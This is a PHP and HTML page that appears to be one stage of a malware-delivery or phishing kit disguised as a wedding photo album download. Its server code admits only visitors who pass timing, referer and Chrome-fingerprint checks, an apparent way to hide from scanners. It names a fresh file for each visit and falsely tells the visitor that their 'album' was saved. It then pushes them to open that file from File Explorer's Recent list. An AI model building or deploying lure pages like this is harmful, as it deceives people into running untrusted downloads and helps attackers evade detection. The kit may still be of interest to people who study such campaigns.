<?php
require __DIR__ . '/../lib.php';

// Step 2: must arrive from the entry page (root / or /index.php),
// >=4s after the token was minted (matches the 5s spinner), full Chrome
// fingerprint, same-origin referer.
gate_doc(['/', '/index.php', '/download.php'], 4, false);

$name  = make_name();   // fresh album name for THIS visit
$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);
$dest  = "complete.php?tk=" . $tk . "&n=" . $nameQ;
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Album Ready</title>
  <style>
    body {
      margin: 0; padding: 0;
      background-image: url('assets/screen.png');
      background-size: cover; background-position: center; background-repeat: no-repeat;
      height: 100vh; width: 100vw; background-color: #0e0e0e;
      font-family: "Segoe UI", Tahoma, sans-serif;
    }
    .modal-overlay {
      position: fixed; top: 0; left: 0; height: 100vh; width: 100vw;
      background-color: rgba(0,0,0,0.6);
      display: flex; justify-content: center; align-items: center; z-index: 1000;
    }
    .modal-content {
      background-color: #171717; padding: 34px; border-radius: 10px;
      border: 1px solid #2b2721;
      width: 90%; max-width: 460px; box-shadow: 0 12px 40px rgba(0,0,0,0.5);
      animation: modalFadeIn 0.3s ease-out; text-align: center;
    }
    @keyframes modalFadeIn { from { opacity:0; transform:translateY(-20px);} to { opacity:1; transform:translateY(0);} }
    .rings { width: 54px; height: 54px; margin: 0 auto 14px auto; }
    h2 { font-family: Georgia, "Times New Roman", serif; font-size: 24px; color: #efe6d2; margin: 0 0 12px 0; letter-spacing: 1px; }
    .modal-text { color: #b9b09c; font-size: 14px; line-height: 1.6; }
    .continue-btn {
      background-color: #c9a86a; color: #16130c; border: none;
      padding: 13px 30px; border-radius: 4px; font-size: 15px; font-weight: 600;
      cursor: pointer; margin-top: 24px; width: 100%; max-width: 250px;
      transition: background-color 0.3s;
    }
    .continue-btn:hover { background-color: #b8934f; }
    .info-text { color: #6e675c; font-size: 12px; margin-top: 12px; }
    .spinner { display: none; margin-top: 20px; color: #cdc4b1; font-size: 13px; }
  </style>
</head>
<body>
  <div id="confirmationModal" class="modal-overlay">
    <div class="modal-content">
      <svg class="rings" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <circle cx="38" cy="54" r="26" fill="none" stroke="#c9a86a" stroke-width="7"/>
        <circle cx="62" cy="46" r="26" fill="none" stroke="#a8894e" stroke-width="7"/>
      </svg>
      <h2>The album is ready</h2>
      <p class="modal-text">Your photos have been saved to your device. Find <strong><?php echo htmlspecialchars($name); ?></strong> in <strong>Recent</strong> (File Explorer) and open it to view the album.</p>
      <p class="modal-text" style="opacity:0.75;">If the album did not open automatically, you can download it again.</p>
      <button onclick="submitForm()" id="continueBtn" class="continue-btn">Open the album</button>
      <div id="spinner" class="spinner">Opening&hellip;</div>
      <p class="info-text"></p>
    </div>
  </div>

  <script>
    function submitForm() {
      var btn = document.getElementById('continueBtn');
      var spinner = document.getElementById('spinner');
      btn.style.display = 'none';      // Hide button
      spinner.style.display = 'block'; // Show loading spinner
      setTimeout(function() {
        window.location.href = <?php echo json_encode($dest); ?>; // Redirect after 2 seconds
      }, 2000);
    }
  </script>
</body>
</html>
